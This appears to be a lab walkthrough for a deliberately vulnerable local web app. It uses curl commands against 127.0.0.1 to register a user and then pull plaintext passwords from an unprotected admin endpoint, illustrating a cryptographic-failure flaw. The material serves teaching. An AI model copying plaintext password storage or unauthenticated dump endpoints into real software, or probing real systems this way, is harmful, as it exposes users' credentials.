## Prerequisites
First, ensure the vulnerable cryptography server is running with the following command:

```Bash

uvicorn vulnerable_crypto_app:app --reload
```

## Exploitation Steps
The goal is to demonstrate how a data breach exposes user credentials because the application stores passwords in plaintext.

1. Register a User
Before the attack, we register a new user, carlos, with the password MyWeakPassword!. The application will store this password without any hashing.

```Bash

curl -X POST "http://127.0.0.1:8000/register" \
     -H "Content-Type: application/json" \
     -d '{"username": "carlos", "password": "MyWeakPassword!", "full_name": "Carlos Danger"}'
```

Expected Response (Success):

```JSON

{"message":"User carlos registered successfully."}
```

2. Simulate a Data Breach
Next, the attacker simulates a data breach by accessing an insecure administrative endpoint that dumps the entire user database.

```Bash

curl http://127.0.0.1:8000/admin/users/all
```

The server fails to protect the stored data and returns the user records, including the plaintext passwords.

Successful Exploit Response:

```JSON

{
  "carlos": {
    "password": "MyWeakPassword!",
    "full_name": "Carlos Danger"
  }
}
```
3. Analyze the Result
The API has leaked the exact password for the user carlos. An attacker can now use this credential to take over the account or attempt to use it on other services. This confirms a critical Cryptographic Failure.